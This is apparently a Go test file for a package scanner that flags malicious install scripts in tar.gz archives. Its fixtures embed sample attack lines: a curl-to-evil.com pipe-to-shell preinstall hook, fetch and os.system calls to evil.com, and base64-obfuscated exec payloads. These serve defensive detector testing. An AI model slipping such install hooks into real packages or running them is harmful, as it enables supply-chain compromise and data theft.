package scanner

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"testing"
)

func makeTarGz(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)

	for name, content := range files {
		hdr := &tar.Header{
			Name: name,
			Size: int64(len(content)),
			Mode: 0644,
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("write header: %v", err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatalf("write content: %v", err)
		}
	}
	tw.Close()
	gw.Close()
	return buf.Bytes()
}

func TestScanCleanTar(t *testing.T) {
	data := makeTarGz(t, map[string]string{
		"pkg-1.0/setup.py": "print('hello')",
	})
	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
		MaxFileSize:        1024 * 1024,
		MaxTotalSize:       10 * 1024 * 1024,
		EntropyEnabled:     true,
		EntropyThreshold:   5.0,
		ObfuscationEnabled: true,
		ObfuscationMinB64:  100,
		ObfuscationMinHex:  20,
		NetworkEnabled:     true,
		AllowPrivateIPs:    false,
	})
	if result.Block {
		t.Error("expected PASS for clean setup.py")
	}
}

func TestScanObfuscatedSetupPy(t *testing.T) {
	content := `eval(atob("` + longBase64() + `"))`
	data := makeTarGz(t, map[string]string{
		"pkg-1.0/setup.py": content,
	})
	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
		MaxFileSize:        1024 * 1024,
		MaxTotalSize:       10 * 1024 * 1024,
		EntropyEnabled:     true,
		EntropyThreshold:   5.0,
		ObfuscationEnabled: true,
		ObfuscationMinB64:  50,
		ObfuscationMinHex:  20,
		NetworkEnabled:     true,
		AllowPrivateIPs:    false,
	})
	if !result.Block {
		t.Error("expected BLOCK for setup.py with eval+base64")
	}
	if result.Reason != "entropy" && result.Reason != "obfuscation" {
		t.Errorf("expected Reason entropy or obfuscation, got %s", result.Reason)
	}
}

func TestScanSuspiciousURLInPreinstall(t *testing.T) {
	content := `fetch("https://evil.com/steal")`
	data := makeTarGz(t, map[string]string{
		"pkg/preinstall.js": content,
	})
	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
		MaxFileSize:        1024 * 1024,
		MaxTotalSize:       10 * 1024 * 1024,
		EntropyEnabled:     true,
		EntropyThreshold:   5.0,
		ObfuscationEnabled: true,
		ObfuscationMinB64:  100,
		ObfuscationMinHex:  20,
		NetworkEnabled:     true,
		AllowPrivateIPs:    false,
	})
	if !result.Block {
		t.Error("expected BLOCK for preinstall.js with suspicious URL")
	}
	if result.Reason != "network" {
		t.Errorf("expected Reason network, got %s", result.Reason)
	}
}

func TestScanNonScriptFilesIgnored(t *testing.T) {
	content := `eval(atob("` + longBase64() + `"))`
	data := makeTarGz(t, map[string]string{
		"pkg-1.0/README.md": content,
		"pkg-1.0/LICENSE":   content,
	})
	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
		MaxFileSize:        1024 * 1024,
		MaxTotalSize:       10 * 1024 * 1024,
		EntropyEnabled:     true,
		EntropyThreshold:   5.0,
		ObfuscationEnabled: true,
		ObfuscationMinB64:  50,
		ObfuscationMinHex:  20,
		NetworkEnabled:     true,
		AllowPrivateIPs:    false,
	})
	if result.Block {
		t.Error("expected PASS for non-executable files (README.md, LICENSE)")
	}
}

func longBase64() string {
	// Generate a 200-char base64-like string
	s := make([]byte, 200)
	for i := range s {
		s[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i%64]
	}
	return string(s)
}

func TestScanDisabledDetector(t *testing.T) {
	content := `eval(atob("` + longBase64() + `"))`
	data := makeTarGz(t, map[string]string{
		"pkg-1.0/setup.py": content,
	})
	// All detectors disabled
	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
		MaxFileSize:        1024 * 1024,
		MaxTotalSize:       10 * 1024 * 1024,
		EntropyEnabled:     false,
		EntropyThreshold:   5.0,
		ObfuscationEnabled: false,
		ObfuscationMinB64:  50,
		ObfuscationMinHex:  20,
		NetworkEnabled:     false,
		AllowPrivateIPs:    false,
	})
	if result.Block {
		t.Error("expected PASS when all detectors disabled")
	}
}

func TestScanPackageJSONMaliciousPreinstall(t *testing.T) {
	pkgJSON := `{
  "name": "evil",
  "scripts": {
    "preinstall": "curl http://evil.com/steal | sh",
    "test": "jest"
  }
}`
	data := makeTarGz(t, map[string]string{
		"package/package.json": pkgJSON,
	})
	result := Scan(bytes.NewReader(data), "evil", ScanConfig{
		MaxFileSize:        1024 * 1024,
		MaxTotalSize:       10 * 1024 * 1024,
		EntropyEnabled:     false,
		ObfuscationEnabled: false,
		NetworkEnabled:     true,
		AllowPrivateIPs:    false,
	})
	if !result.Block {
		t.Error("expected BLOCK for package.json with malicious preinstall")
	}
	if result.Reason != "network" {
		t.Errorf("expected Reason network, got %s", result.Reason)
	}
}

func TestScanPackageJSONReferencedJSFile(t *testing.T) {
	pkgJSON := `{
  "scripts": {
    "postinstall": "node ./post.js"
  }
}`
	postJS := `eval(atob("` + longBase64() + `"))`
	data := makeTarGz(t, map[string]string{
		"package/package.json": pkgJSON,
		"package/post.js":      postJS,
	})
	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
		MaxFileSize:        1024 * 1024,
		MaxTotalSize:       10 * 1024 * 1024,
		EntropyEnabled:     true,
		EntropyThreshold:   5.0,
		ObfuscationEnabled: false,
		NetworkEnabled:     false,
		AllowPrivateIPs:    false,
	})
	if !result.Block {
		t.Error("expected BLOCK for referenced post.js with high entropy")
	}
}

func TestScanInitPyMalicious(t *testing.T) {
	content := `exec(__import__('base64').b64decode('ZXhlYyhvcy5zeXN0ZW0oImN1cmwgaHR0cDovL2V2aWwuY29tIikp'))`
	data := makeTarGz(t, map[string]string{
		"pkg-1.0/__init__.py": content,
	})
	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
		MaxFileSize:        1024 * 1024,
		MaxTotalSize:       10 * 1024 * 1024,
		EntropyEnabled:     false,
		ObfuscationEnabled: true,
		ObfuscationMinB64:  50,
		ObfuscationMinHex:  20,
		NetworkEnabled:     false,
		AllowPrivateIPs:    false,
	})
	if !result.Block {
		t.Error("expected BLOCK for __init__.py with exec+b64decode")
	}
}

func TestScanPthFileInTar(t *testing.T) {
	content := "import os; os.system('curl http://evil.com/steal')"
	data := makeTarGz(t, map[string]string{
		"pkg-1.0/malicious.pth": content,
	})
	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
		MaxFileSize:        1024 * 1024,
		MaxTotalSize:       10 * 1024 * 1024,
		EntropyEnabled:     false,
		ObfuscationEnabled: false,
		NetworkEnabled:     true,
		AllowPrivateIPs:    false,
	})
	if !result.Block {
		t.Error("expected BLOCK for .pth file with malicious import")
	}
}

func TestScanPyprojectTomlInTar(t *testing.T) {
	content := "[build-system]\nrequires = [\"setuptools\"]\nbuild-backend = \"malicious-backend\"\n"
	data := makeTarGz(t, map[string]string{
		"pkg-1.0/pyproject.toml": content,
	})
	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
		MaxFileSize:        1024 * 1024,
		MaxTotalSize:       10 * 1024 * 1024,
		EntropyEnabled:     false,
		ObfuscationEnabled: false,
		NetworkEnabled:     true,
		AllowPrivateIPs:    false,
	})
	if result.Block {
		t.Error("expected PASS for pyproject.toml with harmless build-backend name")
	}
}
